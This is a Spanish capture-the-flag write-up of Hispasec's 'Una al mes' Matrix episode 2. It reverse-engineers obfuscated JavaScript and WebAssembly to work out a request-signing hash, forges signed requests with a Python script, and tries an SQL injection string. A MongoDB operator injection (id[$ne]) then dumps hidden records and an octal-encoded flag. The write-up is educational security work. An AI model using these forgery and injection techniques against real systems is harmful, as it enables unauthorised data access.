# UAM - Matrix - Episode 2

15/04/2019

julianjm - [blog](https://julianjm.github.io) - [telegram](https://t.me/julianjm)

## El reto

> (<a href="https://unaalmes.hispasec.com/challenges#EPISODIO%202">Resumen</a>) Hay que destripar la siguiente web: `http://34.247.69.86/matrix/episodio2/index.php`



## Primeros pasos

Al entrar, vemos información del primer registro (id: 1). Nuestra primera idea es intentar obtener los siguientes registros.

```bash
curl "http://34.247.69.86/matrix/episodio2/index.php?id=2"
[...]
Undefined hash
```

Nos dice que hash no está definido:

```bash
curl "http://34.247.69.86/matrix/episodio2/index.php?id=2&hash=prueba"
[...]
Hash error
```

Entendemos que el servidor espera algún tipo de firma... Probamos a pasar como hash el md5, sha1, sha256, del valor en id, pero siempre vemos el mismo error.

## Javascript + Web Assembly

Investigamos un poco la web, y vemos que hace referencia a un par de ficheros javascript. Empezamos por index.min.js. Lo formateamos con el chrome (pinchando en{}) y obtenemos código parcialmente ofuscado. Buscando en google algunas constantes que aparecen, como 0x28955b88, vemos que se pertenece a una función que realiza el MD5. Vamos bien.

Al final del fichero vemos dos funciones. nono() nos trollea cada vez que hacemos un resize de la página. doIt() es extraña, porque nadie la llama:

```javascript
function doIt(_0x3a59ab) {
    var _0x5482b3 = OMG(_0x3a59ab);
    var _0x32ea98 = '0x' + _0x5482b3[_0x3358('0x13')](0x0, 0x8);
    var _0x38175b = '0x' + _0x5482b3[_0x3358('0x13')](0x8, 0x8);
    var _0x49b2a5 = '0x' + _0x5482b3[_0x3358('0x13')](0x10, 0x8);
    var _0x340f9f = '0x' + _0x5482b3[_0x3358('0x13')](0x18, 0x8);
    return Module[_0x3358('0x14')](_0x32ea98, _0x38175b, _0x49b2a5, _0x340f9f);
}
```

Después de desofuscarla nos queda esto:
```javascript
function doIt(val) {
    var md5 = OMG(val);
    var p1 = '0x' + md5.substr(0, 8);
    var p2 = '0x' + md5.substr(8, 8);
    var p3 = '0x' + md5.substr(16, 8);
    var p4 = '0x' + md5.substr(24, 8);
    return Module['_calc'](p1, p2, p3, p4);
}
```

Poniendo unos *console.log()* vemos que OMG está haciendo el MD5. Posteriormente divide ese hash en 4 partes de 8 `nibbles`, y se los pasa a la función *_calc*...

Probamos a llamarla desde la consola del navegador:

```javascript
doIt(1)
113948091
doIt(2)
-163535797
```

La función *_calc* está definida en main.js. Este fichero parece autogenerado. Es una especie de interfaz entre el navegador y el fichero main.wasm, Web Assembly.

Usaremos wasmdec, que intenta decompilar los webassembly a C. El fichero que genera es bastante grande, pero buscando por *_calc*, vemos estas líneas:

```c
/*
	Function 'fn_4':
		WASM name: '4'
		Export name: '_calc'
*/

int fn_4(int local_0, int local_1, int local_2, int local_3) { 
    // Quitamos mucha paja

	local_11 = local_0;
	local_12 = local_1;
	local_13 = local_2;
	local_14 = local_3;
	local_16 = local_11;
	local_4 = local_12;
	local_5 = local_16 ^ local_4;
	local_6 = local_13;
	local_7 = local_5 ^ local_6;
	local_8 = local_14;
	local_9 = local_7 ^ local_8;
	local_15 = local_9;
	local_10 = local_15;

	return local_10;    //Resumiendo ese churro, devuelve el xor entre los 4 parámetros.
}
```

## Generando hashes

Suponemos que el metodo de hashing utilizado es el de la función *_calc* que acabamos de ver, es decir, md5 y xor de sus 4 bloques de 4 bytes. Volvemos a la carga:

```bash
$ curl "http://34.247.69.86/matrix/episodio2/index.php?id=1&hash=113948091"
[...]
Hash error
```

Nos damos cabezazos contra el teclado mientras esperamos que liberen una pista:
> El hash requerido utiliza la string "34.247.69.86/matrix/episodio2/index.php?id=(?)"

Aaaaamigo. Ya sabemos cómo firmar nuestras peticiones. Probamos con el id=1:

```javascript
doIt("34.247.69.86/matrix/episodio2/index.php?id=1")
-1758453311
```

```bash
$ curl "http://34.247.69.86/matrix/episodio2/index.php?id=1&hash=-1758453311"
[...]
Hash error
```

Sigue fallando. En este punto ya tenía una función que calculaba los hashes en python, y resulta que los calcula como un entero sin signo. El mismo hash quedaría como 2536513985:

```bash
$ curl "http://34.247.69.86/matrix/episodio2/index.php?id=1&hash=2536513985"
[...]
Id: 1<br>Nombre: Morfeo<br>Sexo: Varon
```

Vamos bien. Como nota curiosa, la forma de convertir de entero con signo a sin signo en javascript es hacer uso del operador `>>>` (shift right), que convierte a unsigned. Si le pedimos que cambie 0 bits, nos deja el mismo valor, pero sin signo:

```javascript
doIt("34.247.69.86/matrix/episodio2/index.php?id=1") >>> 0
2536513985
```

## Automatizando con Python

Ahora que sabemos cómo interactuar con la página, vamos a automatizarlo. 

```python
import hashlib
import requests

def calc_hash(val):
    m = hashlib.md5(str(val).encode()).hexdigest()

    p0 = int(m[ 0: 8], 16)
    p1 = int(m[ 8:16], 16)
    p2 = int(m[16:24], 16)
    p3 = int(m[24:32], 16)

    return p0 ^ p1 ^ p2 ^ p3

if len(sys.argv)>1:
    id=sys.argv[1]
    datos_a_firmar="34.247.69.86/matrix/episodio2/index.php?id=" + str(id)
    h=calc_hash(datos_a_firmar)

    r = requests.get("http://34.247.69.86/matrix/episodio2/index.php", {"id":id, "hash":h})
    print(r.text)
else:
    print("python3 makerequest.py <id>)

```

Con este script podemos generar peticiones para parámetrios id arbitrarios. Vemos que hay registros hasta el 7, pero el 8 devuelve vacío.
Intentamos (con cuidado) probar hasta el 100, pero no encontramos nada.
Intentamos también realizar inyecciones SQL del tipo `id="0' or '1'='1"`. Puede que esté más filtrado de la cuenta, o que directamente no sea SQL.

Probamos inyección para Mongodb. Se basa en hacer llegar un array (en lugar de un string) a la función que hace la consulta. La consulta `['id'=>$_GET['id']]`, que en condiciones normales compara *id* con un string, si conseguimos pasarle un array, podemos añadir modificadores.

Por ejemplo, `['id => ['$ne'=>'1']]` buscaría todos registros cuyo *id* sea distinto de 1.

Gracias a PHP, crear arrays es de lo más sencillo. Pasando ?id[hola]=mundo a la petición web, obtenemos en la parte php la siguiente variable $_GET['id'], que contiene el array [ "hola" => "mundo" ].

Modificamos la petición de la función anterior:

```python
r = requests.get("http://34.247.69.86/matrix/episodio2/index.php", {"id[$ne]":id, "hash":h})
```

Nota: Nos damos cuenta de que, aunque pasemos una array, el servidor sigue calculando el hash con el valor final de *id*, en lugar de con el array en sí, lo cual agradecemos, ya que complicaría la inyección enormemente... (o no, nunca lo sabremos, md5(array() devuelve NULL :))

```html
$ python3 makerequest.py 0
[...]
Id: 1<br>Nombre: Morfeo<br>Sexo: Varon
 <br><br>Id: 2<br>Nombre: Trinity<br>Sexo: Mujer
 <br><br>Id: 3<br>Nombre: Oraculo<br>Sexo: Mujer
 <br><br>Id: 4<br>Nombre: Cypher<br>Sexo: Varon
 <br><br>Id: 5<br>Nombre: Dozer<br>Sexo: Varon
 <br><br>Id: 6<br>Nombre: Neo<br>Sexo: Varon
 <br><br>Id: 7<br>Nombre: Mujer de rojo<br>Sexo: Mujer
 <br><br>Id: 57069<br>Nombre: 125:101:115:173:61:60:66:67:62:64:60:71:60:145:64:142:62:70:146:64:62:145:67:63:70:66:62:60:141:64:60:67:65:67:146:62:175<br>Sexo: XXX
```

Bingo!

## Última parte

Por fin vemos datos del último registro. Por fuerza bruta, con ese Id, habríamos tardado un buen rato. 

Solo nos falta decodificarlos. Una simple conversión a ASCII no funciona. Nos damos cuenta (despúes de un rato) que no hay ningún numero 8 ni 9. Podría ser octal.

```bash
$ NUMEROS=`echo 125:101:115:173:61:60:66:67:62:64:60:71:60:145:64:142:62:70:146:64:62:145:67:63:70:66:62:60:141:64:60:67:65:67:146:62:175 | tr ':' ' '`
$ for n in $NUMEROS ; do rax2 ${n}o ; done | rax2 -s

UAM{106724090e4b28f42e738620a40757f2}
```

Ahí, abusando de radare :)

En fin, un buen reto, con muchos temas de los que aprender. Esperando al reto del próximo mes!

